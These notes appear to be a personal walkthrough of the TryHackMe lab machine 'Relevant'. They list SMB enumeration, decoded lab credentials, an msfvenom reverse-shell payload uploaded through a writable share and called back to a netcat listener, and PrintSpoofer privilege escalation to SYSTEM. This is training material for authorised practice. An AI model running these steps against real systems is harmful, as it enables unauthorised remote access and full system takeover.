# Relevant — TryHackMe
## Info
- OS: Windows Server 2016
- Ports: 80, 135, 139, 445, 3389, 49663

## Enumeration
- smbclient -L //target -N
- found share: nt4wrksv
- downloaded passwords.txt — base64 encoded credentials
- decoded: Bob:!P@$$W0rD!123 / Bill:Juw4nnaM4n420696969!$$$
- port 49663 — second IIS server
- http://target:49663/nt4wrksv/passwords.txt accessible — SMB maps to web root

## Exploitation
- msfvenom -p windows/x64/shell_reverse_tcp LHOST=tun0 LPORT=4444 -f aspx -o shell.aspx
- smbclient //target/nt4wrksv -N → put shell.aspx
- nc -lvnp 4444
- visit http://target:49663/nt4wrksv/shell.aspx

## Privilege Escalation
- whoami /priv → SeImpersonatePrivilege enabled
- upload PrintSpoofer64.exe to SMB share
- PrintSpoofer64.exe -i -c "cmd.exe" → SYSTEM shell

## Lessons
- always scan all ports, not just top 1000
- SMB write access + web server = shell upload path
- SeImpersonatePrivilege → PrintSpoofer/GodPotato
- Error 225 = AV blocked payload, try cmd.exe directly
